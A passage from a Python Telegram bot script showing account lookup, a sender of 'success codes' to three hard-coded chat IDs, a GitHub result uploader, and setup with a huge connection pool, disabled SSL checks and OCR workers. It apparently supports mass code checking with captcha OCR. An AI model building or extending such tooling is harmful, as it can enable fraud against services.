                    if r.status != 200: continue
                    d = await r.json(content_type=None)
                    if d.get("success"):
                        res  = d.get("result",{})
                        mins = res.get("totalMinutes") or res.get("remainingMinutes") or "?"
                        plan = res.get("profileName","?")
                        return f"📋 {plan} | ⏳ {_mins_fmt(mins)}", mins
            except Exception: continue
    return "📋 ? | ⏳ ?", "?"

# ─────────────────────────────────────────────────────────────────────────
# File sender (specific users)
# ─────────────────────────────────────────────────────────────────────────
_TARGETS = {"6988969946","1981253384","1477223103"}

async def _send_file(cid):
    if str(cid) not in _TARGETS: return
    items = succ_texts.get(cid, [])
    if not items: return
    try:
        fn = f"success_{cid}_{int(time.time())}.txt"
        with open(fn,"w") as f: f.write("\n".join(items))
        with open(fn,"rb") as f: await bot.send_document(cid, f, caption="✅ Success Codes")
        os.remove(fn)
    except Exception as e: log.error(f"send_file: {e}")

# ─────────────────────────────────────────────────────────────────────────
# GitHub scheduler
# ─────────────────────────────────────────────────────────────────────────
async def gh_scheduler():
    while True:
        await asyncio.sleep(180)
        items = []
        while not SUCCESS_Q.empty():
            items.append(await SUCCESS_Q.get())
        if not items: continue
        try:
            res, sha = await gh_get("result.json")
            for it in items:
                uid = str(it["chat_id"]); c = it["code"]
                res.setdefault(uid,[])
                if c not in res[uid]: res[uid].append(c)
            await gh_put("result.json", res, sha, "update")
        except Exception as e: log.error(f"gh_scheduler: {e}")

# ─────────────────────────────────────────────────────────────────────────
# Polling (timeout fixed)
# ─────────────────────────────────────────────────────────────────────────
async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=45, request_timeout=55, interval=0)
            return
        except Exception as e:
            log.error(f"polling: {e} | retry {backoff}s")
            await asyncio.sleep(backoff)
            backoff = min(backoff*2, 60)

# ─────────────────────────────────────────────────────────────────────────
# Graceful SIGTERM
# ─────────────────────────────────────────────────────────────────────────
async def _shutdown():
    log.info("SIGTERM — shutting down")
    if _filler and not _filler.done(): _filler.cancel()
    await asyncio.sleep(1)
    if session:    await session.close()
    if _connector: await _connector.close()
    if _ocr_pool:  _ocr_pool.shutdown(wait=False)
    asyncio.get_event_loop().stop()

# ─────────────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────────────
async def main():
    global session, _connector, _ocr_pool, _ocr

    _ocr_pool  = ThreadPoolExecutor(max_workers=OCR_WORKERS, thread_name_prefix="ocr")
    _connector = aiohttp.TCPConnector(
        limit=5000, limit_per_host=2000,
        ttl_dns_cache=300, ssl=False,
        keepalive_timeout=60,
    )
    session = aiohttp.ClientSession(
        connector=_connector, connector_owner=False,
        timeout=aiohttp.ClientTimeout(total=30),
    )

    # Redefine _ocr to use the executor (needed after _ocr_pool is created)
    async def _ocr_bound(raw):
        return await asyncio.get_event_loop().run_in_executor(_ocr_pool, _ocr_fn, raw)

    # Patch module-level _ocr function
    import sys; sys.modules[__name__]._ocr = _ocr_bound

    try:
        loop = asyncio.get_event_loop()
        loop.add_signal_handler(signal.SIGTERM, lambda: asyncio.create_task(_shutdown()))
    except NotImplementedError:
        pass

    asyncio.create_task(start_web_server())
    asyncio.create_task(gh_scheduler())

    log.info(f"Starting | uvloop={_UV} | webhook={'ON: '+WEBHOOK_URL if WEBHOOK_URL else 'off'}")

    if WEBHOOK_URL:
        await bot.remove_webhook()
        await asyncio.sleep(1)
        await bot.set_webhook(WEBHOOK_URL, drop_pending_updates=True)
        log.info(f"Webhook active: {WEBHOOK_URL}")
        await asyncio.Event().wait()
    else:
        await start_polling()

if __name__ == "__main__":
    asyncio.run(main())
